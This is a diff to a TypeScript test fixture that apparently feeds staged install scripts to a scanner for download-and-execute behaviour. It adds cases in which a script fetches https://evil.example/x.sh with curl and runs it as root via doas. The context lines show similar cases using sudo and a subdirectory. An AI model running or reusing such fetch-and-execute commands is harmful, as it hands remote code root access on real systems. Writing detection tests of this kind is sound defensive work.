@@ -67,6 +67,14 @@ const STAGED: Record<string, [string, string]> = {
     "install.sh",
     "#!/bin/sh\ncurl -o /tmp/x.sh https://evil.example/x.sh\nsudo sh /tmp/x.sh\n",
   ],
+  "run with doas sh": [
+    "install.sh",
+    "#!/bin/sh\ncurl -o /tmp/x.sh https://evil.example/x.sh\ndoas sh /tmp/x.sh\n",
+  ],
+  "run with doas -u root sh": [
+    "install.sh",
+    "#!/bin/sh\ncurl -o /tmp/x.sh https://evil.example/x.sh\ndoas -u root sh /tmp/x.sh\n",
+  ],
   "downloaded into a subdirectory, run as ./sub/x.sh": [
     "install.sh",
     "#!/bin/sh\ncurl -o sub/x.sh https://evil.example/x.sh\n./sub/x.sh\n",
